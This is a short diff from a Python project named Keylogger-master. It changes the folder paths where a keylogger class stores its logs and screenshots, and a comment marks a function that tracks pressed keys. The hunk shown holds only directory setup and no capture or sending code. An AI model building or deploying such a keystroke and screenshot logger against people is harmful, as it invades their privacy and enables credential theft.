@@ -33,9 +33,9 @@ class keylogger_main:
     
     def _build_logs(self):   #To create the directory which contains all the data
         if not os.path.exists('Desktop/Keylogger-master'):
-            os.mkdir('C:/Users/ARYAN/Desktop/Keylogger-master')
-            os.mkdir('C:/Users/ARYAN/Desktop/Keylogger-master/Screenshots')
-            os.mknod('C:/Users/ARYAN/Desktop/Keylogger-master/log.txt')
+            os.mkdir('Desktop/Keylogger-master')
+            os.mkdir('Desktop/Keylogger-master/Screenshots')
+            os.mknod('Desktop/Keylogger-master/log.txt')
     
     def _on_press(self,k):       #This Function keeps track of pressed keys
         global keys, count
